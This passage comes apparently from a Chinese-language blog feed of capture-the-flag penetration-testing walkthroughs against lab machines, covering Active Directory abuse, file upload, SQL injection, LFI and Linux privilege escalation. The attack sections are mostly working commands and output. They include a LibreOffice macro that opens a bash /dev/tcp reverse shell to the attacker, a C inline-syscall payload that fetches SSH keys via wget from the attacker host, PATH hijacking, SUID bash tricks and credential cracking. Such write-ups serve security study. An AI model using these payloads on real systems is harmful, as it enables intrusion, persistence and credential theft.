    *Evil-WinRM* PS C:\wirteTEMP&gt; $SecurePassword = ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force
    ```
*   **重置密码**
    现在，我们可以调用函数，并传入转换后的 `SecureString` 对象。
    ```powershell
    *Evil-WinRM* PS C:\wirteTEMP&gt; Set-DomainUserPassword -Identity jianyin -AccountPassword $SecurePassword -Verbose
    Verbose: [Set-DomainUserPassword] Attempting to set the password for user 'jianyin'
    Verbose: [Set-DomainUserPassword] Password for user 'jianyin' successfully reset
    ```
    命令成功执行，我们已完全控制 `jianyin` 账户。

### 4.4. 触发漏洞，获取 SYSTEM 权限

至此，所有拼图都已集齐：`tindalos` 放置了后门，`lihua` 帮助我们控制了 `jianyin`，而 `jianyin` 正是那个拥有“引爆”权限的人。

*   **使用新凭据登录**
    我们现在以 `jianyin` 的身份登录，他的密码已被我们重置为 `P@ssword123!`。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ evil-winrm -i 192.168.205.149 -u 'jianyin' -p 'P@ssword123!'
    ...
    *Evil-WinRM* PS C:\Users\jianyin\Documents&gt; whoami
    bicker\jianyin
    ```
*   **准备监听并重启服务**
    在 Kali 上开启 Netcat 监听，准备接收反弹 Shell。然后在 `jianyin` 的会话中，执行重启 DNS 服务的命令。
    ```bash
    # 在 Kali 终端
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ nc -lvnp 8888
    listening on [any] 8888 ...
    ```
    ```powershell
    # 在 jianyin 的 evil-winrm shell 中
    *Evil-WinRM* PS C:\Users\jianyin\Documents&gt; Restart-Service DNS
    ```
*   **接收 Shell，提权成功**
    DNS 服务重启时，加载了我们预先设置的恶意 DLL。Kali 的监听窗口成功接收到连接，我们获得了一个 `NT AUTHORITY\SYSTEM` 权限的 shell。
    ```bash
    ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
    └─$ nc -lvnp 8888
    listening on [any] 8888 ...
    connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 58463
    Microsoft Windows [�汾 10.0.20348.169]
    (c) Microsoft Corporation����������Ȩ����
    
    C:\Windows\system32&gt;whoami
    nt authority\system
    ```

# **四、夺取凭证**

获得域控的最高权限后，我们直接进入管理员桌面，查找并读取最终的 flag。

```
C:\Windows\system32&gt;cd C:\Users\Administrator\Desktop\

C:\Users\Administrator\Desktop&gt;dir
 ������ C �еľ�û�б�ǩ��
 �������к��� D05C-A317

 C:\Users\Administrator\Desktop ��Ŀ¼

2025/08/15  18:36    &lt;DIR&gt;          .
2025/08/15  16:59    &lt;DIR&gt;          ..
2025/08/15  17:06             2,288 Microsoft Edge.lnk
2025/08/15  18:37                54 root.txt
               2 ���ļ�          2,342 �ֽ�
               2 ��Ŀ¼ 38,144,806,912 �����ֽ�

C:\Users\Administrator\Desktop&gt;type root.txt
root{7c1e4b8a2d6f3b9c5e0a}
```
成功获取 root flag，本次渗透测试圆满结束。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_bicker.html</guid><pubDate>Sun, 17 Aug 2025 03:01:08 +0000</pubDate></item><item><title>thl_ElCandidato</title><link>https://7r1UMPHK.github.io/post/thl_ElCandidato.html</link><description># 一、信息收集

## 1. 主机发现

首先，在当前网段内进行主机发现，确定目标靶机的IP地址。使用`arp-scan`工具扫描本地网络。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.131 08:00:27:71:8b:9b       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e9:a7:63       VMware, Inc.
...
```

扫描结果显示，目标主机IP为 `192.168.205.131`。

## 2. 端口扫描

确认目标IP后，使用`nmap`对目标进行全端口扫描，以探测其开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.131                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 21:52 EDT
Nmap scan report for 192.168.205.131
Host is up (0.00021s latency).
Not shown: 65527 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s
MAC Address: 08:00:27:71:8B:9B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.29 seconds
```

扫描发现目标开放了多个端口，包括`22 (SSH)`、`80 (HTTP)`、`445 (SMB)`以及多个邮件服务端口。我们首先从最容易获取信息的HTTP服务入手。

## 3. Web信息探测

访问`http://192.168.205.131`，发现是一个招聘网站。在浏览网站内容时，注意到其链接指向了一个域名 `gyhabogados.thl`。为了方便后续的探测，将其添加到本地`/etc/hosts`文件。

```bash
# 将以下行添加到 /etc/hosts 文件
192.168.205.131 gyhabogados.thl
```

**子域名爆破**

由于发现了邮件服务端口，推测可能存在如`mail`之类的子域名。使用`wfuzz`结合`HOST`头对子域名进行爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wfuzz -c -u 'http://gyhabogados.thl' -H 'HOST:FUZZ.gyhabogados.thl' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 671
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                          
=====================================================================
000000002:   200        96 L     343 W      5580 Ch     'mail - mail' 
...
```

成功发现子域名 `mail.gyhabogados.thl`，同样将其添加到`/etc/hosts`文件。

**目录扫描**

接着使用`gobuster`对主站进行目录扫描，寻找可利用的路径或文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://gyhabogados.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
...
/uploads              (Status: 301) [Size: 320] [--&gt; http://gyhabogados.thl/uploads/]
/images               (Status: 301) [Size: 319] [--&gt; http://gyhabogados.thl/images/]
/index.php            (Status: 200) [Size: 7760]
/config               (Status: 301) [Size: 319] [--&gt; http://gyhabogados.thl/config/]
/roundcube            (Status: 301) [Size: 322] [--&gt; http://gyhabogados.thl/roundcube/]
...
```

扫描结果中，我们发现了一些关键目录，如 `/uploads`、`/config`，以及一个Webmail系统 `/roundcube`。

# 二、漏洞利用与初步访问

重新访问网站，在`http://gyhabogados.thl/work-with-us.php`页面发现了一个文件上传功能，允许求职者上传简历。测试发现该功能似乎会对文档文件进行处理，这可能是一个攻击入口。

我们尝试构造一个包含反向Shell宏的`.odt`（OpenDocument Text）文件。当服务器端应用（如LibreOffice）打开此文件以解析其内容时，可能会自动执行宏，从而触发我们的Payload。

**宏制作**

1. 在LibreOffice Writer中，通过 `工具 -&gt; 宏 -&gt; 管理宏 -&gt; Basic` 创建一个新的宏。

2. 写入用于创建反向Shell的Basic脚本代码。以下为示例：

   ```basic
   Sub Main
       Dim command as String
       command = 'bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1''
       Shell(command)
   End Sub
   ```

3. 将此宏绑定到文档的“打开文档”事件上，并保存为`.odt`格式。

**获取Shell**

在Kali上设置`netcat`监听8888端口，然后通过网站上传构造好的`.odt`文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888                 
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 55862
bash: cannot set terminal process group (2362): Inappropriate ioctl for device
bash: no job control in this shell
bash: /home/bob/.bashrc: Permission denied
bob@TheHackersLabs-Gyhabogados:~$ id
uid=1000(bob) gid=1000(bob) groups=1000(bob),27(sudo),100(users)
```

成功接收到反弹Shell，当前用户为`bob`。

# 三、权限提升

## 1. Shell稳定化

为了更好的交互体验，使用以下命令序列将简易Shell升级为功能完整的TTY。

```bash
script /dev/null -c bash
# 按下 Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 24 columns 80
```

## 2. bob -&gt; sam

在之前目录扫描发现的 `/config` 目录中，查找敏感信息。

```bash
bob@TheHackersLabs-Gyhabogados:/var/www/html/config$ cat db.php 
&lt;?php

$mysqli = mysqli_connect('127.0.0.1', 'bob', 'sup3rS3cretP4ssword_2024!', 'candidatos');

if (mysqli_error($mysqli)) {
  die('Ocurrio un error al conectarse a la base de datos ' . mysqli_error($mysqli));
}
```

发现了数据库凭据 `bob:sup3rS3cretP4ssword_2024!`。尝试使用该密码切换用户或执行sudo，但均失败。

回到`bob`用户的主目录，发现一个加密的7z压缩文件 `credentials.7z`。

```bash
bob@TheHackersLabs-Gyhabogados:~$ ls
credentials.7z
```

使用`scp`将其传输回Kali进行破解。

```bash
bob@TheHackersLabs-Gyhabogados:~$ scp credentials.7z kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
```

在Kali上，使用`7z2john`提取哈希，然后用`john`和`rockyou.txt`字典进行破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z2john credentials.7z &gt; hash
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
barcelona        (credentials.7z)     
...
```

密码成功破解为 `barcelona`。解压文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x credentials.7z
...
Enter password (will not be echoed):
...
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat credentials.txt
bob:a7gyqqp6bt2!uv@2u
```

得到一对新凭据 `bob:a7gyqqp6bt2!uv@2u`。结合之前发现的webmail系统（`http://mail.gyhabogados.thl/roundcube/`），使用此凭据登录`bob`的邮箱。

在邮箱中，发现了一封包含`sam`用户凭据的邮件。

&gt; **邮件内容摘要:**
&gt; Usuario: sam
&gt; Contraseña: Welcome2024!

使用`su`命令和新获取的密码切换到`sam`用户。

```bash
bob@TheHackersLabs-Gyhabogados:~$ su sam
Password: Welcome2024!
sam@TheHackersLabs-Gyhabogados:/home/bob$ id
uid=1002(sam) gid=1006(abogados) groups=1006(abogados),100(users)
```

## 3. sam -&gt; dean

成为`sam`用户后，查看`/etc/samba/smb.conf`文件，发现在多个Samba共享中，`sam`可以访问 `[CONFIDENCIALES]` 和 `[RESPALDOS_IT]`。

```bash
sam@TheHackersLabs-Gyhabogados:/tmp$ cat /etc/samba/smb.conf
...
[RESPALDOS_IT]
  comment = Respaldos IT
  path = /mnt/RESPALDOS_IT
  ...
  valid users = sam, dean
```

检查 `/mnt/RESPALDOS_IT` 目录内容。

```bash
sam@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ ls -al
total 16
drwxr-x--- 2 root abogados 4096 Dec  8  2024 .
drwxr-xr-x 5 root root     4096 Dec  8  2024 ..
-rw-r--r-- 1 root abogados  520 Dec  8  2024 credenciales.psafe3
-rw-r--r-- 1 root abogados  582 Dec  7  2024 IMPORTANTE.txt

sam@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ cat IMPORTANTE.txt
...
La contraseña maestra es similar a la que te proporcioné en la bienvenida: 'ChevyImpala1967'. Sin embargo, en lugar de '1967', deberás usar un año diferente.
```

发现一个`PasswordSafe`的密码库文件 `credenciales.psafe3` 和一个提示文件。提示表明主密码格式为 `ChevyImpala` 加上一个年份。

将`credenciales.psafe3`传输到Kali，并生成一个年份字典进行破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ seq -f 'ChevyImpala%g' 1967 2025 &gt; p
└─$ pwsafe2john credenciales.psafe3 &gt; hash
└─$ john --wordlist=p hash
...
ChevyImpala1995  (credencial)
...
```

密码库主密码为 `ChevyImpala1995`。使用`pwsafe`等工具打开密码库，发现其中存储了`dean`用户的凭据。

&gt; **密码库内容:**
&gt; dean:MasterOfPuppets1986

切换到`dean`用户。

```bash
sam@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ su dean
Password: MasterOfPuppets1986
dean@TheHackersLabs-Gyhabogados:/mnt/RESPALDOS_IT$ id
uid=1001(dean) gid=1006(abogados) groups=1006(abogados),100(users)
```

## 4. dean -&gt; john

`dean`用户同样可以访问Samba共享。检查 `[IT_TOOLS]` 共享。

```bash
dean@TheHackersLabs-Gyhabogados:~$ cd /mnt/IT_TOOLS/
dean@TheHackersLabs-Gyhabogados:/mnt/IT_TOOLS$ ls -al
total 12
drwxr-x--- 2 root it   4096 Dec  8  2024 .
drwxr-xr-x 5 root root 4096 Dec  8  2024 ..
-rw-r--r-- 1 root root 1458 Dec  7  2024 private_key.ppk
```

发现了一个`PuTTY`格式的私钥文件 `private_key.ppk`。查看其内容可知该密钥未加密。

```bash
dean@TheHackersLabs-Gyhabogados:/mnt/IT_TOOLS$ strings private_key.ppk
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
...
```

将私钥传输回Kali，并使用`puttygen`转换为OpenSSH格式。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ puttygen private_key.ppk -O private-openssh -o /tmp/id_rsa
└─$ chmod 600 /tmp/id_rsa
```

根据`/home`目录下的用户列表，推测该密钥属于`john`用户。尝试使用该密钥SSH登录。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh john@192.168.205.131 -i /tmp/id_rsa
...
john@TheHackersLabs-Gyhabogados:~$ id
uid=1003(john) gid=1003(john) groups=1003(john),100(users),1005(it)
```

成功以`john`用户身份登录。

## 5. john -&gt; root

登录后，检查`john`的`sudo`权限，提示需要密码。

```bash
john@TheHackersLabs-Gyhabogados:~$ sudo -l
[sudo] password for john: 
sudo: a password is required
```

在之前`dean`用户的邮箱中，曾发现一张名为`impala_67.jpg`的图片。这通常暗示了隐写术。通过使用隐写工具（如`stegseek`）分析该图片，可以提取出`john`用户的密码。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ stegseek impala_67.jpg                              
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: 'ironmaiden'
[i] Original filename: 'credentials.txt'.
[i] Extracting to 'impala_67.jpg.out'.
...
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat impala_67.jpg.out
john: TI!Powerful2024
```

获取到密码 `john:TI!Powerful2024`。再次检查`sudo`权限。

```bash
john@TheHackersLabs-Gyhabogados:~$ sudo -l
[sudo] password for john: TI!Powerful2024
...
User john may run the following commands on TheHackersLabs-Gyhabogados:
    (ALL) PASSWD: /usr/bin/python3 /home/john/tools/backup.py
```

`john`用户可以以root权限执行一个位于`/home/john/tools/backup.py`的Python脚本。但检查发现该文件和目录并不存在。

```bash
john@TheHackersLabs-Gyhabogados:~$ ls -al /home/john/tools/backup.py
ls: cannot access '/home/john/tools/backup.py': No such file or directory
```

这是一个典型的sudo权限配置错误。我们可以自行创建该脚本，并写入提权代码。这里选择为`/bin/bash`添加SUID权限位。

```bash
john@TheHackersLabs-Gyhabogados:~$ echo 'import os; os.system('chmod +s /bin/bash')' &gt; /home/john/tools/backup.py
```

执行`sudo`命令触发Payload。

```bash
john@TheHackersLabs-Gyhabogados:~$ sudo /usr/bin/python3 /home/john/tools/backup.py
john@TheHackersLabs-Gyhabogados:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

可以看到`/bin/bash`已成功设置SUID位。现在执行`bash -p`即可获得一个euid为0的root权限Shell。

```bash
john@TheHackersLabs-Gyhabogados:~$ bash -p
bash-5.2# id
uid=1003(john) gid=1003(john) euid=0(root) egid=0(root) groups=0(root),100(users),1003(john),1005(it)
```

# 四、获取凭证

成功提权至root后，读取最终的flag文件。

```bash
bash-5.2# cat /home/dean/user.txt
930b5a4b9098abfdaa67f93a937593bf

bash-5.2# cat /root/notes.txt | grep Flag
Flag: 63baa2b1cd7ac490cf34e7c6a317067b
```

成功获取user和root两个flag，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_ElCandidato.html</guid><pubDate>Sun, 17 Aug 2025 03:00:01 +0000</pubDate></item><item><title>thl_BackToTheFutureI</title><link>https://7r1UMPHK.github.io/post/thl_BackToTheFutureI.html</link><description># 一、信息收集

## 1.1 主机发现

首先，使用`arp-scan`工具扫描本地网络，寻找目标靶机的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.142 08:00:27:b0:b9:32       PCS Systemtechnik GmbH
...
```

发现目标主机IP为 `192.168.205.142`。

## 1.2 端口扫描

使用`nmap`对目标主机进行全端口扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.142
...
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
...
```

扫描结果显示，主机开放了FTP(21)、SSH(22)、HTTP(80)和MySQL(3306)四个端口。

#### 1.3 服务探测

逐一排查已发现的服务：

*   **FTP (21)**: 尝试匿名登录，被拒绝。
*   **SSH (22)**: 尝试使用`hydra`进行密码爆破，被目标服务器拒绝，错误信息显示不支持密码认证，这暗示需要使用密钥登录。
*   **MySQL (3306)**: 尝试使用`root`用户远程连接，被拒绝，错误信息显示攻击机IP不在允许连接的列表中。
*   **HTTP (80)**: 访问80端口，页面自动跳转到域名 `hillvalley.thl`。

# 二、Web渗透

## 2.1 域名配置与信息发掘

根据跳转信息，编辑本地`/etc/hosts`文件，将域名`hillvalley.thl`指向目标IP。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts                                                                                 
192.168.205.142 hillvalley.thl
```

访问`http://hillvalley.thl`，发现一个以“时间旅行日志”为主题的登录页面。查看页面源代码，发现一条有趣的西班牙语注释：`&lt;!-- ¡El reloj de la torre no tiene nada que ver! ¿O sí? --&gt;` (钟楼跟这事没关系！真的吗？)，这是靶机主题的暗示。

## 2.2 SQL注入漏洞利用

面对登录框，首先尝试进行SQL注入。使用`sqlmap`工具自动化检测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sqlmap -u 'http://hillvalley.thl/' --batch --forms
...
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
...
```

`sqlmap`确认了`username`参数存在基于时间的SQL盲注。随后，利用此漏洞dump数据库信息。

```bash
# 获取数据库
sqlmap -u 'http://hillvalley.thl/' --batch --forms --dbs
# ...
[*] hillvalley
[*] information_schema

# 获取表
sqlmap -u 'http://hillvalley.thl/' --batch --forms -D hillvalley --tables
# ...
+-------+
| users |
+-------+

# dump数据
sqlmap -u 'http://hillvalley.thl/' --batch --forms -D hillvalley -T users --dump
# ...
+----+--------------------------------------------------------------+----------+
| id | password                                                     | username |
+----+--------------------------------------------------------------+----------+
| 1  | $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy | marty    |
+----+--------------------------------------------------------------+----------+
```

成功获取到用户`marty`的密码哈希。

## 2.3 哈希破解

使用`John the Ripper`和`rockyou.txt`字典对获取的bcrypt哈希进行破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo '$2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy' &gt; hash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
andromeda        (?)     
...
```

破解得到密码为`andromeda`。

# 三、初始访问 (Initial Access)

## 3.1 漏洞组合获取Webshell

尝试使用`marty:andromeda`通过SSH登录，但因服务器配置为公钥认证而失败。

回到Web应用，使用破解的凭据`marty:andromeda`成功登录后台。登录后发现URL结构为`http://hillvalley.thl/admin.php?page=about.php`，这极有可能存在本地文件包含（LFI）漏洞。

尝试读取`/etc/passwd`文件：

```
http://hillvalley.thl/admin.php?page=../../../../etc/passwd
```

页面成功回显了文件内容，证实了LFI漏洞的存在。接下来，利用`php://filter`配合`php_filter_chain_generator`工具生成payload，绕过限制执行PHP代码。

&gt; **知识点补充**: `php://filter`是PHP中一个强大的封装协议，它允许在读取文件时对其内容进行过滤和处理。`php_filter_chain_generator`工具可以生成一系列复杂的`iconv`编码转换链，利用特定PHP版本中的bug，最终导致任意代码执行。
&gt;
&gt; **工具链接**:https://github.com/synacktiv/php_filter_chain_generator

成功生成反弹shell的payload并执行，在本地Kali上使用`nc`监听，获得了`www-data`用户的shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
└─$ nc -lvnp 8888                 
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 45106
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 四、权限提升 (Privilege Escalation)

## 4.1 横向移动：www-data -&gt; marty

在`www-data`的shell中，查看Web目录下的`config.php`文件，发现了数据库的硬编码凭据。

```bash
www-data@hillvalley:/var/www/project/app$ cat config.php 
&lt;?php
$host = 'localhost';
$user = 'marty';
$pass = 't1m3travel';
$db = 'hillvalley';
...
?&gt;
```

发现用户`marty`的另一个密码`t1m3travel`。使用此密码成功从`www-data`切换到`marty`用户。

```bash
www-data@hillvalley:/var/www/project/app$ su marty
Password: 
marty@hillvalley:/var/www/project/app$ id
uid=1001(marty) gid=1001(marty) groups=1001(marty)
```

在`marty`的主目录下，找到并读取了`user.txt`，获得第一个flag。

## 4.2 横向移动：marty -&gt; docbrown

作为`marty`用户，开始寻找进一步提权的方法。`sudo -l`显示没有sudo权限。在主目录下发现一个属于`docbrown`用户的笔记文件`.flux_notes`，内容为`Tiempos inestables... aún necesito arreglar el runner para la próxima prueba.` (不稳定的时期... 我仍然需要为下一次测试修复runner。)，暗示存在一个名为'runner'的程序。

使用`getcap`命令检查系统文件的Linux Capabilities，发现了一个关键配置：

```bash
marty@hillvalley:~$ getcap -r / 2&gt;/dev/null
/usr/local/bin/backup_runner cap_setuid=ep
...
```

&gt; **知识点补充**: Linux Capabilities将root用户的特权分解为更小的单元。`cap_setuid=ep`表示`/usr/local/bin/backup_runner`这个程序拥有任意设置进程UID的能力，这是非常强大的权限。

使用`strings`命令分析`backup_runner`，发现它会调用`tar`命令，并且没有使用绝对路径。

```bash
marty@hillvalley:~$ strings /usr/local/bin/backup_runner
...
Usage: backup_runner &lt;filename&gt;
tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs
...
```

这构成了一个典型的`$PATH`劫持漏洞。通过在`/tmp`目录下创建一个恶意的`tar`脚本，并将其路径添加到`$PATH`环境变量的最前面，可以劫持`backup_runner`的执行流。

```bash
marty@hillvalley:~$ cd /tmp
marty@hillvalley:/tmp$ echo '#!/bin/bash' &gt; tar
marty@hillvalley:/tmp$ echo '/bin/bash -p' &gt;&gt; tar
marty@hillvalley:/tmp$ chmod +x tar
marty@hillvalley:/tmp$ export PATH=/tmp:$PATH
marty@hillvalley:/tmp$ /usr/local/bin/backup_runner x
docbrown@hillvalley:/tmp$ id
uid=1000(docbrown) gid=1001(marty) groups=1001(marty)
```

执行后，成功切换为`docbrown`用户。

## 4.3 最终提权：docbrown -&gt; root

作为`docbrown`用户，再次执行`sudo -l`检查权限。

```bash
docbrown@hillvalley:/tmp$ sudo -l
...
User docbrown may run the following commands on hillvaley:
    (root) NOPASSWD: /usr/local/bin/time_daemon
```

发现`docbrown`可以免密以`root`身份运行`/usr/local/bin/time_daemon`。尝试执行该程序，得到报错信息：

```bash
docbrown@hillvalley:/home/docbrown$ sudo /usr/local/bin/time_daemon
[FLUX] No existe el archivo /tmp/sync: No such file or directory
```

程序试图访问`/tmp/sync`文件。这与之前在`marty`用户下发现的`crontab`条目联系了起来：

```bash
marty@hillvalley:~$ cat /etc/crontab
...
* * * * * root /usr/local/bin/flux_admin.sh
marty@hillvalley:~$ ls -al /usr/local/bin/flux_admin.sh
ls: cannot access '/usr/local/bin/flux_admin.sh': No such file or directory
marty@hillvalley:~$ ls -al /usr/local/bin/
total 40
drwxr-xr-x  2 root root  4096 Jul 14 21:53 .
drwxr-xr-x 10 root root  4096 Jul 11 21:56 ..
-rwxr-xr-x  1 root root 16200 Jul 12 20:49 backup_runner
-rwx------  1 root root 16296 Jul 14 20:44 time_daemon
```

定时任务每分钟都以`root`权限执行一个当时还不存在的脚本`/usr/local/bin/flux_admin.sh`。这里的提权思路是：猜测`time_daemon`会复制`/tmp/sync`去`flux_admin.sh`

1. **创建Payload**：在`/tmp`目录下创建`sync`文件，内容是我们的提权命令。

```bash
docbrown@hillvalley:/home/docbrown$ echo '#!/bin/bash' &gt; /tmp/sync
docbrown@hillvalley:/home/docbrown$ echo 'chmod +s /bin/bash' &gt;&gt; /tmp/sync
    docbrown@hillvalley:/home/docbrown$ chmod +x /tmp/sync
```

2. **触发文件写入**：以`root`权限执行`time_daemon`。该程序会读取`/tmp/sync`的内容，并将其写入到`/usr/local/bin/flux_admin.sh`中。

   ```bash
   docbrown@hillvalley:/home/docbrown$ sudo /usr/local/bin/time_daemon
   [88MPH] Sincronización completada. Listo para viajar.
   ```

3. **等待Cron Job执行**：等待最多一分钟，`crontab`中的定时任务会自动以`root`权限执行`/usr/local/bin/flux_admin.sh`，从而为`/bin/bash`添加SUID权限位。

4. **获取Root Shell**：检查`/bin/bash`权限，确认SUID位已设置后，执行`bash -p`获取root权限。

   ```bash
   docbrown@hillvalley:/home/docbrown$ ls -al /bin/bash
   -rwsr-sr-x 1 root root 1265648 Apr 18 19:47 /bin/bash
   docbrown@hillvalley:/home/docbrown$ bash -p
   bash-5.2# id
   uid=1000(docbrown) gid=1001(marty) euid=0(root) egid=0(root) groups=0(root),1001(marty)
   ```

5. **读取最终Flag**：

   ```bash
   bash-5.2# cat /root/root.txt /home/marty/user.txt 
   FLAG{1.21_gigawatts_of_root_power}
   FLAG{D3_L0r34n}
   ```

成功提权至`root`，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_BackToTheFutureI.html</guid><pubDate>Sat, 16 Aug 2025 05:11:22 +0000</pubDate></item><item><title>内部_Sysadmin</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Sysadmin.html</link><description># **一、信息收集**

## **1. 主机发现与端口扫描**

首先，在本地网络中利用 `arp-scan` 扫描存活主机，定位目标IP。随后，使用 `nmap` 对目标主机进行全端口扫描，以识别其开放的端口与服务。

**主机发现:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.145 08:00:27:8f:61:6e       PCS Systemtechnik GmbH
...
```

通过ARP扫描，确认目标主机的IP地址为 `192.168.205.145`。

**端口扫描:**

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.145
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 22:40 EDT
Nmap scan report for 192.168.205.145
Host is up (0.00026s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:8F:61:6E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
```

Nmap的扫描结果显示，目标主机对外开放了 **22 (SSH)** 和 **80 (HTTP)** 两个TCP端口。

# **二、漏洞发现与初始访问**

## **1. Web服务侦察与漏洞分析**

通过浏览器访问 `http://192.168.205.145`，发现一个提供C语言在线编译和执行功能的Web应用。通过审查页面源代码注释，我们获取了其后端的编译指令：

```
gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out
```

此编译命令中包含一个关键参数 `-nostdinc`。该参数的作用是阻止编译器链接任何标准库的头文件（例如 `stdio.h`, `unistd.h` 等）。这意味着，所有依赖标准库函数（如 `system()`, `fork()`, `execve()`）的常规反弹Shell Payload均会因链接失败而无法通过编译，常规的攻击方式在此处失效。

## **2. 绕过编译限制获取Shell**

为了成功绕过 `-nostdinc` 参数带来的限制，我们不能依赖C语言的库函数，而必须转向更底层的实现方式：通过内联汇编直接执行系统调用（syscall）。

**攻击思路如下：**
构造一个特殊的C语言Payload，其核心是利用内联汇编直接调用 `execve` 系统调用来执行任意命令。该命令将指示目标服务器从我们的攻击机上下载预先准备好的SSH公钥，并将其写入目标用户 `echo` 的 `~/.ssh/authorized_keys` 文件中，从而为我们建立一个持久化的SSH免密登录通道。（这里需要注意，Sublarge设置了timeout 3s，所以尽量写authorized_keys，或者使用Sublarge的思路）

*ps:Sublarge的办法在文末*

**Payload (`exploit.c`):**

```c
long syscall(long num, long p1, long p2, long p3);

int main() {
    char *sh = '/bin/bash';
    char *arg1 = 'bash';
    char *arg2 = '-c';
    char *cmd = 'mkdir -p ~/.ssh &amp;&amp; busybox wget http://192.168.205.128/authorized_keys -O ~/.ssh/authorized_keys &amp;&amp; chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys &amp;&amp; busybox wget http://192.168.205.128:80?$(whoami)';

    const long SYS_EXECVE = 59;

    
    char *argv[] = {arg1, arg2, cmd, 0};

    syscall(SYS_EXECVE, (long)sh, (long)argv, 0);

    
    while(1) {
        syscall(37, 0, 0, 0);
    }

    return 0;
